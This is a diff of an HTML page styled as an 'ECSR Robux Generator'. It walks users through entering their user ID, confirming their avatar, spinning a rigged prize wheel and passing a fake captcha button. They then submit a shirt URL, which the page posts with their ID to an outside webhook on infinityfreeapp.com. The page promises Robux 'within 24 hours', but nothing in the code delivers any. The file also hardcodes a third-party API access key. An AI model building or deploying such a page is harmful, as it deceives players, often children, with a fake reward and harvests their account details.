@@ -1,150 +1,458 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>ECSR Robux Giveaway</title>
-  <style>
-    body {
-      font-family: 'Segoe UI', sans-serif;
-      background-color: #f5f5f5;
-      text-align: center;
-      padding: 40px;
-    }
-    h1 {
-      color: #333;
-    }
-    input, button {
-      padding: 10px;
-      margin: 10px;
-      font-size: 16px;
-    }
-    button {
-      cursor: pointer;
-    }
-    .section {
-      margin-top: 30px;
-      display: none;
-    }
-    #avatar img, #profileImg img {
-      border-radius: 10px;
-      margin-top: 10px;
-    }
-    .hidden {
-      display: none;
-    }
-  </style>
+    <title>ECSR Robux Generator</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+          body {
+            font-family: 'Roboto', sans-serif;
+            background: #0a0a2a;
+            color: white;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #1565c0, #0d47a1);
+            padding: 30px 0;
+            text-align: center;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+        }
+        
+        .header h1 {
+            margin: 0;
+            font-size: 2.5em;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background: rgba(20, 20, 60, 0.7);
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,0,255,0.2);
+        }
+        
+        .step {
+            display: none;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+        
+        .step.active {
+            display: block;
+        }
+        
+        .input-group {
+            margin: 20px 0;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            color: #64b5f6;
+        }
+        
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #1565c0;
+            border-radius: 5px;
+            background: rgba(10, 10, 40, 0.8);
+            color: white;
+            font-size: 16px;
+        }
+        
+        button {
+            background: linear-gradient(135deg, #2196f3, #1976d2);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.2);
+        }
+        
+        button:hover {
+            background: linear-gradient(135deg, #42a5f5, #1e88e5);
+            box-shadow: 0 6px 8px rgba(0,0,0,0.3);
+            transform: translateY(-2px);
+        }
+        
+        button:disabled {
+            background: #757575;
+            cursor: not-allowed;
+        }
+        
+        .user-verification {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 20px 0;
+            gap: 20px;
+        }
+        
+        .user-avatar {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            border: 3px solid #2196f3;
+            object-fit: cover;
+        }
+        
+        .user-screenshot {
+            width: 200px;
+            border: 3px solid #2196f3;
+            border-radius: 5px;
+        }
+        
+        .verification-buttons {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        
+        .wheel-container {
+            position: relative;
+            width: 300px;
+            height: 300px;
+            margin: 30px auto;
+        }
+        
+        .wheel {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            position: relative;
+            overflow: hidden;
+            border: 5px solid #333;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99);
+            transform: rotate(0deg);
+        }
+        
+        .wheel-section {
+            position: absolute;
+            width: 50%;
+            height: 50%;
+            transform-origin: bottom right;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 18px;
+            color: white;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.7);
+            clip-path: polygon(0 0, 100% 0, 100% 100%);
+        }
+        
+        .wheel-pointer {
+            position: absolute;
+            top: -10px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0;
+            height: 0;
+            border-left: 15px solid transparent;
+            border-right: 15px solid transparent;
+            border-top: 30px solid #f44336;
+            z-index: 10;
+            filter: drop-shadow(0 0 5px rgba(0,0,0,0.5));
+        }
+        
+        .result {
+            text-align: center;
+            font-size: 24px;
+            margin: 20px 0;
+            padding: 15px;
+            background: rgba(30, 30, 70, 0.7);
+            border-radius: 5px;
+            display: none;
+        }
+        
+        .result-amount {
+            font-size: 32px;
+            font-weight: bold;
+            color: #4caf50;
+            margin: 10px 0;
+        }
+        
+        .shirt-form {
+            margin-top: 20px;
+            display: none;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .loading-spinner {
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 5px solid #2196f3;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .captcha-container {
+            margin: 20px 0;
+            padding: 20px;
+            background: rgba(30, 30, 70, 0.7);
+            border-radius: 5px;
+            text-align: center;
+        }
+        
+        .success-message {
+            text-align: center;
+            font-size: 20px;
+            color: #4caf50;
+            margin: 20px 0;
+            display: none;
+        }
+        
+        .error-message {
+            color: #f44336;
+            text-align: center;
+            margin: 10px 0;
+            display: none;
+        }
+    </style>
 </head>
 <body>
+    <div class="header">
+        <h1>ECSR Robux Generator</h1>
+    </div>
+    
+    <div class="container">
+        <!-- Step 1: Enter User ID -->
+        <div id="step1" class="step active">
+            <h2>Step 1: Enter Your ECSR User ID</h2>
+            <div class="input-group">
+                <label for="userId">Your ECSR User ID:</label>
+                <input type="text" id="userId" placeholder="Enter your ECSR user ID">
+            </div>
+            <button id="verifyBtn">Verify</button>
+            <div class="error-message" id="userIdError"></div>
+        </div>
 
-  <h1>ECSR Robux Giveaway</h1>
+        <!-- Step 2: Avatar & Screenshot -->
+        <div id="step2" class="step">
+            <h2>Step 2: Verify Your Account</h2>
+            <div class="user-verification">
+                <img id="userAvatar" class="user-avatar" src="" alt="User Avatar">
+                <img id="userScreenshot" class="user-screenshot" src="" alt="Profile Screenshot">
+            </div>
+            <p style="text-align: center;">Is this you?</p>
+            <div class="verification-buttons">
+                <button id="yesBtn">Yes, that's me</button>
+                <button id="noBtn">No, that's not me</button>
+            </div>
+            <div class="error-message" id="verificationError"></div>
+        </div>
 
-  <input type="text" id="userId" placeholder="Enter ECSR User ID">
-  <button onclick="verifyUser()">Check</button>
+        <!-- Step 3: Spin Wheel -->
+        <div id="step3" class="step">
+            <h2>Step 3: Spin the Wheel</h2>
+            <p style="text-align: center;">Spin the wheel to win between 10-100 Robux!</p>
+            <div class="wheel-container">
+                <div class="wheel-pointer"></div>
+                <div class="wheel" id="wheel"></div>
+            </div>
+            <button id="spinBtn">Spin Wheel</button>
+            <div class="result" id="result">
+                <p>You won:</p>
+                <div class="result-amount" id="resultAmount"></div>
+                <p>Robux!</p>
+            </div>
+        </div>
 
-  <div class="section" id="avatar"></div>
-  <div class="section" id="profileImg"></div>
+        <!-- Step 4: Captcha -->
+        <div id="step4" class="step">
+            <h2>Step 4: Complete Verification</h2>
+            <p style="text-align: center;">Complete the captcha to claim your Robux</p>
+            <div class="captcha-container">
+                <div id="captcha"></div>
+            </div>
+            <div class="error-message" id="captchaError"></div>
+        </div>
 
-  <div class="section" id="confirm">
-    <p>Is this you?</p>
-    <button onclick="proceed()">Yes</button>
-    <button onclick="reset()">No</button>
-  </div>
+        <!-- Step 5: Submit Shirt -->
+        <div id="step5" class="step">
+            <h2>Step 5: Claim Your Robux</h2>
+            <div class="shirt-form">
+                <div class="input-group">
+                    <label for="shirtUrl">Shirt URL (Create a shirt for the amount you won):</label>
+                    <input type="text" id="shirtUrl" placeholder="https://ecsr.io/catalog/...">
+                </div>
+                <button id="submitShirtBtn">Submit Shirt</button>
+                <div class="error-message" id="shirtError"></div>
+            </div>
+            <div class="success-message" id="successMessage">
+                Your Robux will be delivered within 24 hours!
+            </div>
+        </div>
 
-  <div class="section" id="wheel">
-    <p>Spin the wheel!</p>
-    <button onclick="spinWheel()">🎡 SPIN</button>
-  </div>
+        <div class="loading" id="loading">
+            <div class="loading-spinner"></div>
+            <p>Processing your request...</p>
+        </div>
+    </div>
 
-  <div class="section" id="reward"></div>
+    <script>
+        let currentStep = 1;
+        let userId = '';
+        let robuxWon = 0;
+        let isSpinning = false;
 
-  <div class="section" id="captchaSection">
-    <p>Complete CAPTCHA to continue:</p>
-    <!-- Replace with real CAPTCHA widget -->
-    <button onclick="captchaPassed()">✅ I'm not a robot</button>
-  </div>
+        const steps = document.querySelectorAll('.step');
+        const wheel = document.getElementById('wheel');
+        const resultAmount = document.getElementById('resultAmount');
 
-  <div class="section" id="shirtSection">
-    <p>Enter your shirt URL to claim your Robux:</p>
-    <input type="text" id="shirtUrl" placeholder="https://ecsr.io/shirt/...">
-    <button onclick="submitClaim()">Submit</button>
-  </div>
+        const wheelSections = [
+            { color: '#f44336', text: '10', value: 10 },
+            { color: '#e91e63', text: '20', value: 20 },
+            { color: '#9c27b0', text: '30', value: 30 },
+            { color: '#673ab7', text: '40', value: 40 },
+            { color: '#3f51b5', text: '50', value: 50 },
+            { color: '#2196f3', text: '60', value: 60 },
+            { color: '#03a9f4', text: '70', value: 70 },
+            { color: '#00bcd4', text: '80', value: 80 },
+            { color: '#009688', text: '90', value: 90 },
+            { color: '#4caf50', text: '100', value: 100 }
+        ];
 
-  <script>
-    let userId = '';
-    let rewardAmount = 0;
+        function createWheel() {
+            wheel.innerHTML = '';
+            const sectionAngle = 360 / wheelSections.length;
+            wheelSections.forEach((section, index) => {
+                const sectionElement = document.createElement('div');
+                sectionElement.className = 'wheel-section';
+                sectionElement.style.backgroundColor = section.color;
+                sectionElement.style.transform = `rotate(${index * sectionAngle}deg)`;
+                const textElement = document.createElement('div');
+                textElement.textContent = section.text;
+                textElement.style.transform = `rotate(${sectionAngle / 2}deg) translate(70px) rotate(-${sectionAngle / 2}deg)`;
+                sectionElement.appendChild(textElement);
+                wheel.appendChild(sectionElement);
+            });
+        }
 
-    function verifyUser() {
-      userId = document.getElementById('userId').value.trim();
-      if (!userId) return alert("Please enter a valid user ID.");
+        function nextStep() {
+            steps[currentStep - 1].classList.remove('active');
+            currentStep++;
+            steps[currentStep - 1].classList.add('active');
+            if (currentStep === 3) {
+                createWheel();
+                document.getElementById('spinBtn').disabled = false;
+            }
+            if (currentStep === 4) loadCaptcha();
+            if (currentStep === 5) document.querySelector('.shirt-form').style.display = 'block';
+        }
 
-      const avatarUrl = `https://ecsr.io/apisite/thumbnails/v1/users/avatar-headshot?userIds=${userId}`;
+        function spinWheel() {
+            if (isSpinning) return;
+            isSpinning = true;
+            document.getElementById('spinBtn').disabled = true;
+            document.getElementById('result').style.display = 'none';
 
-      fetch(avatarUrl)
-        .then(res => res.json())
-        .then(data => {
-          const imagePath = data.data[0]?.imageUrl;
-          if (!imagePath) throw new Error("Invalid response");
+            const winningIndex = Math.floor(Math.random() * wheelSections.length);
+            robuxWon = wheelSections[winningIndex].value;
+            const sectionAngle = 360 / wheelSections.length;
+            const targetAngle = 360 * 5 + (360 - (winningIndex * sectionAngle + sectionAngle / 2));
 
-          const avatarImg = "https://ecsr.io" + imagePath;
-          const profileImg = `https://api.apiflash.com/v1/urltoimage?access_key=91aeaa0c407e4f089e1c49af78437242&url=https%3A%2F%2Fecsr.io%2Fusers%2F${userId}%2Fprofile&format=png&delay=8&response_type=image`;
+            wheel.style.transition = 'transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99)';
+            wheel.style.transform = `rotate(${targetAngle}deg)`;
 
-          document.getElementById('avatar').innerHTML = `<img src="${avatarImg}" width="120">`;
-          document.getElementById('profileImg').innerHTML = `<img src="${profileImg}" width="300">`;
+            setTimeout(() => {
+                isSpinning = false;
+                resultAmount.textContent = robuxWon;
+                document.getElementById('result').style.display = 'block';
+                setTimeout(nextStep, 2000);
+            }, 4000);
+        }
 
-          document.getElementById('avatar').style.display = 'block';
-          document.getElementById('profileImg').style.display = 'block';
-          document.getElementById('confirm').style.display = 'block';
-        })
-        .catch(err => {
-          alert("User not found or API error.");
-          console.error(err);
+        function loadCaptcha() {
+            document.getElementById('captcha').innerHTML = `
+                <p>Please verify you're not a robot</p>
+                <button onclick="verifyCaptcha()">✅ I'm not a robot</button>
+            `;
+        }
+
+        function verifyCaptcha() {
+            nextStep();
+        }
+
+        function showError(el, msg) {
+            el.textContent = msg;
+            el.style.display = 'block';
+            setTimeout(() => { el.style.display = 'none'; }, 3000);
+        }
+
+        document.getElementById('verifyBtn').addEventListener('click', () => {
+            userId = document.getElementById('userId').value.trim();
+            if (!userId) return showError(document.getElementById('userIdError'), 'Enter a valid ID');
+
+            document.getElementById('userAvatar').src = `https://ecsr.io/apisite/thumbnails/v1/users/avatar-headshot?userIds=${userId}`;
+            document.getElementById('userScreenshot').src = `https://api.apiflash.com/v1/urltoimage?access_key=91aeaa0c407e4f089e1c49af78437242&url=https%3A%2F%2Fecsr.io%2Fusers%2F${userId}%2Fprofile&format=png&delay=8&response_type=image`;
+            nextStep();
         });
-    }
 
-    function proceed() {
-      document.getElementById('confirm').style.display = 'none';
-      document.getElementById('wheel').style.display = 'block';
-    }
+        document.getElementById('yesBtn').addEventListener('click', nextStep);
+        document.getElementById('noBtn').addEventListener('click', () => {
+            showError(document.getElementById('verificationError'), 'Wrong ID');
+            steps[currentStep - 1].classList.remove('active');
+            currentStep = 1;
+            steps[0].classList.add('active');
+        });
 
-    function reset() {
-      window.location.reload();
-    }
+        document.getElementById('spinBtn').addEventListener('click', spinWheel);
 
-    function spinWheel() {
-      rewardAmount = (Math.floor(Math.random() * 10) + 1) * 10; // 10 - 100
-      document.getElementById('reward').innerHTML = `🎉 You won ${rewardAmount} Robux!`;
-      document.getElementById('reward').style.display = 'block';
-      document.getElementById('captchaSection').style.display = 'block';
-    }
+        document.getElementById('submitShirtBtn').addEventListener('click', () => {
+            const shirtUrl = document.getElementById('shirtUrl').value.trim();
+            if (!shirtUrl.includes('ecsr.io/catalog/')) return showError(document.getElementById('shirtError'), 'Invalid shirt URL');
 
-    function captchaPassed() {
-      document.getElementById('captchaSection').style.display = 'none';
-      document.getElementById('shirtSection').style.display = 'block';
-    }
+            fetch('http://just-testingg.infinityfreeapp.com/webhook.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    userId: userId,
+                    robuxWon: robuxWon,
+                    shirtUrl: shirtUrl
+                })
+            })
+            .then(res => res.json())
+            .then(() => {
+                document.querySelector('.shirt-form').style.display = 'none';
+                document.getElementById('successMessage').style.display = 'block';
+            })
+            .catch(() => {
+                showError(document.getElementById('shirtError'), 'Failed to submit');
+            });
+        });
 
-    function submitClaim() {
-      const shirtUrl = document.getElementById('shirtUrl').value.trim();
-      if (!shirtUrl.startsWith("http")) return alert("Enter a valid shirt URL.");
-
-      fetch('https://github.com/Wumpu7/aa/tree/main', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          userId: userId,
-          reward: rewardAmount,
-          shirtUrl: shirtUrl
-        })
-      })
-      .then(res => res.json())
-      .then(() => {
-        alert("Your claim has been submitted! We’ll review and pay out shortly.");
-        window.location.reload();
-      })
-      .catch(() => {
-        alert("Error sending claim.");
-      });
-    }
-  </script>
-
+        window.verifyCaptcha = verifyCaptcha;
+    </script>
 </body>
 </html>
